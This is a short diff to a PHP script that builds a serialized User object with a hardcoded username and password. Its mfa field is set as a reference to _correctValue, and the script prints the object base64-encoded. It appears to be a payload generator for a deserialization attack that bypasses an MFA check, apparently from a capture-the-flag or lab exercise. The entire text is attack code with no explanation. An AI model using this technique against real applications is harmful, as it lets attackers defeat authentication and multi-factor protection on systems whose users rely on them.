@@ -138,12 +138,11 @@ class User
 {
     public $username = "D0loresH4ze";
     public $password = "rasmuslerdorf";
-    public $mfa = 13;
+    public $mfa;
     public $_correctValue;
 }
 
 $user = new User();
-//$user->_correctValue =& $user->_mfa;
 $user->mfa =& $user->_correctValue;
 
 echo base64_encode(serialize($user));
